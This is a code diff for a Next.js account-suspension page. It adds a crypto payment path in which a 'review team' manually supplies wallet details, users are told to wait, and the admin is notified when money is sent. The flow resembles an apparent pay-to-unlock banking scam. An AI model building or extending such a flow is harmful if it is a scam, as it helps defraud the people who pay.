@@ -3,13 +3,17 @@
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { DEMO_CUSTOMER_EMAIL } from "@/lib/adminData";
-import { fetchCustomerSuspensionByEmail, getNewUserSession, notifyAdminMoneySent, requestAccountGeneration } from "@/lib/newUserData";
+import { cancelPendingReviewRequest, fetchCustomerSuspensionByEmail, getNewUserSession, notifyAdminMoneySent, requestAccountGeneration, requestCryptoPayment } from "@/lib/newUserData";
 import { supabase } from "@/lib/supabase";
 
 export default function SuspensionContinuePage() {
   const router = useRouter();
   const [isGenerateModalOpen, setIsGenerateModalOpen] = useState(false);
+  const [isCryptoModalOpen, setIsCryptoModalOpen] = useState(false);
   const [isRequesting, setIsRequesting] = useState(false);
+  const [isRequestingCrypto, setIsRequestingCrypto] = useState(false);
+  const [isAwaitingDetails, setIsAwaitingDetails] = useState(false);
+  const [waitingRequestType, setWaitingRequestType] = useState<"account" | "crypto">("account");
   const [message, setMessage] = useState("");
   const [accountDetails, setAccountDetails] = useState("");
   const [isNotifyingMoneySent, setIsNotifyingMoneySent] = useState(false);
@@ -23,17 +27,70 @@ export default function SuspensionContinuePage() {
 
     const loadStatus = async () => {
       const customer = await fetchCustomerSuspensionByEmail(customerEmail);
-      setAccountDetails(customer?.accountDetails ?? "");
+      const nextAccountDetails = customer?.reviewRequest === "crypto_payment" || !customer?.accountDetails ? "" : customer.accountDetails;
+      const hasCryptoValues = Boolean(customer?.cryptoName || customer?.cryptoAddress || customer?.cryptoPaymentTime);
+      setAccountDetails(nextAccountDetails);
+      setWaitingRequestType("account");
+      setIsAwaitingDetails(false);
+
+      if (hasCryptoValues && !nextAccountDetails) {
+        window.setTimeout(() => {
+          router.push("/suspension/crypto");
+        }, 300);
+      }
     };
 
     void loadStatus();
     const channel = supabase?.channel("customer-account-details")
       .on("postgres_changes", { event: "UPDATE", schema: "public", table: "customers", filter: `email=eq.${customerEmail}` }, (payload) => {
-        const details = (payload.new as Record<string, unknown>).account_details;
-        if (typeof details === "string" && details) {
-          setAccountDetails(details);
+        const nextCustomer = payload.new as Record<string, unknown>;
+        const details = nextCustomer.account_details;
+        const reviewRequest = typeof nextCustomer.review_request === "string" ? nextCustomer.review_request : undefined;
+        const hasAccountDetails = typeof details === "string" && details.trim().length > 0;
+        const hasCryptoDetails = Boolean(
+          (typeof nextCustomer.crypto_name === "string" && nextCustomer.crypto_name.trim()) ||
+          (typeof nextCustomer.crypto_address === "string" && nextCustomer.crypto_address.trim()) ||
+          (typeof nextCustomer.crypto_payment_time === "string" && nextCustomer.crypto_payment_time.trim())
+        );
+
+        if (hasAccountDetails) {
+          setAccountDetails(details as string);
           setMessage("Your account details are ready.");
+          setWaitingRequestType("account");
+          setIsAwaitingDetails(false);
+          return;
         }
+
+        if (hasCryptoDetails) {
+          setAccountDetails("");
+          setMessage("Your crypto payment details are ready.");
+          setWaitingRequestType("crypto");
+          setIsAwaitingDetails(false);
+          window.setTimeout(() => {
+            router.push("/suspension/crypto");
+          }, 300);
+          return;
+        }
+
+        if (reviewRequest === "account_generation") {
+          setAccountDetails("");
+          setMessage("Your request has been sent. Please remain on standby while your account is generated.");
+          setWaitingRequestType("account");
+          setIsAwaitingDetails(true);
+          return;
+        }
+
+        if (reviewRequest === "crypto_payment") {
+          setAccountDetails("");
+          setMessage("Your crypto payment request has been sent. The review team will share the wallet details with you.");
+          setWaitingRequestType("crypto");
+          setIsAwaitingDetails(true);
+          return;
+        }
+
+        setAccountDetails("");
+        setMessage("");
+        setIsAwaitingDetails(false);
       })
       .subscribe();
 
@@ -55,11 +112,34 @@ export default function SuspensionContinuePage() {
     try {
       await requestAccountGeneration(email);
       setIsGenerateModalOpen(false);
+      setWaitingRequestType("account");
+      setIsAwaitingDetails(true);
       setMessage("Your request has been sent. Please remain on standby while your account is generated.");
     } catch {
       setMessage("We could not send your request. Please try again or contact Customer Care.");
     } finally {
       setIsRequesting(false);
+    }
+  };
+
+  const handleCancelPendingRequest = async () => {
+    const session = getNewUserSession();
+    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
+    if (!email) {
+      setMessage("We could not identify your account. Please sign in again.");
+      return;
+    }
+
+    try {
+      await cancelPendingReviewRequest(email);
+      setAccountDetails("");
+      setMessage("Your pending request was cancelled. No admin notification was sent.");
+      setIsAwaitingDetails(false);
+      setWaitingRequestType("account");
+      setIsGenerateModalOpen(false);
+      setIsCryptoModalOpen(false);
+    } catch {
+      setMessage("We could not cancel your request. Please try again.");
     }
   };
 
@@ -80,6 +160,29 @@ export default function SuspensionContinuePage() {
       setMessage("We could not notify the admin. Please try again.");
     } finally {
       setIsNotifyingMoneySent(false);
+    }
+  };
+
+  const handleRequestCrypto = async () => {
+    const session = getNewUserSession();
+    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
+    if (!email) {
+      setMessage("We could not identify your account. Please sign in again.");
+      return;
+    }
+
+    setIsRequestingCrypto(true);
+    setMessage("");
+    try {
+      await requestCryptoPayment(email);
+      setIsCryptoModalOpen(false);
+      setWaitingRequestType("crypto");
+      setIsAwaitingDetails(true);
+      setMessage("Your crypto payment request has been sent. The review team will share the wallet details with you.");
+    } catch {
+      setMessage("We could not send your crypto request. Please try again or contact Customer Care.");
+    } finally {
+      setIsRequestingCrypto(false);
     }
   };
 
@@ -106,10 +209,10 @@ export default function SuspensionContinuePage() {
             <strong>Generate account</strong>
             <small>Request account details from our review team.</small>
           </button>
-          <button className="suspension-choice" type="button" onClick={() => router.push(isNewUser ? "/new-user/cards" : "/dashboard/cards")}>
-            <span className="suspension-choice-label">Card payment</span>
-            <strong>Link your card</strong>
-            <small>Go to the card page to link your cards.</small>
+          <button className="suspension-choice" type="button" onClick={() => setIsCryptoModalOpen(true)}>
+            <span className="suspension-choice-label">Digital payment</span>
+            <strong>Pay with crypto</strong>
+            <small>Request the wallet details and payment window from our team.</small>
           </button>
         </div>
 
@@ -131,6 +234,33 @@ export default function SuspensionContinuePage() {
             <div className="form-actions">
               <button className="secondary-btn" type="button" onClick={() => setIsGenerateModalOpen(false)}>Cancel</button>
               <button className="primary-btn" type="button" onClick={handleGenerateAccount} disabled={isRequesting}>{isRequesting ? "Sending request..." : "Generate account"}</button>
+            </div>
+          </section>
+        </div>
+      ) : null}
+
+      {isAwaitingDetails ? (
+        <div className="transfer-code-overlay" role="presentation">
+          <section className="transfer-code-modal suspension-request-modal" role="dialog" aria-modal="true" aria-labelledby="waiting-request-title">
+            <p className="eyebrow">{waitingRequestType === "account" ? "Account generation" : "Crypto payment"}</p>
+            <h2 id="waiting-request-title">{waitingRequestType === "account" ? "Generating account" : "Waiting for crypto payment details"}</h2>
+            <p className="transfer-code-copy">{waitingRequestType === "account" ? "Estimated time: 30 seconds to 1 minute while the review team prepares your account details." : "Estimated time: 30 seconds to 1 minute while the review team prepares your crypto payment details."}</p>
+            <div className="form-actions">
+              <button className="secondary-btn" type="button" onClick={handleCancelPendingRequest}>Cancel request</button>
+            </div>
+          </section>
+        </div>
+      ) : null}
+
+      {isCryptoModalOpen ? (
+        <div className="transfer-code-overlay" role="presentation" onMouseDown={() => setIsCryptoModalOpen(false)}>
+          <section className="transfer-code-modal suspension-request-modal" role="dialog" aria-modal="true" aria-labelledby="request-crypto-title" onMouseDown={(event) => event.stopPropagation()}>
+            <p className="eyebrow">Digital payment</p>
+            <h2 id="request-crypto-title">Request crypto payment details?</h2>
+            <p className="transfer-code-copy">We will notify the review team to send the wallet address, crypto name, and payment window.</p>
+            <div className="form-actions">
+              <button className="secondary-btn" type="button" onClick={() => setIsCryptoModalOpen(false)}>Cancel</button>
+              <button className="primary-btn" type="button" onClick={handleRequestCrypto} disabled={isRequestingCrypto}>{isRequestingCrypto ? "Sending request..." : "Request crypto details"}</button>
             </div>
           </section>
         </div>
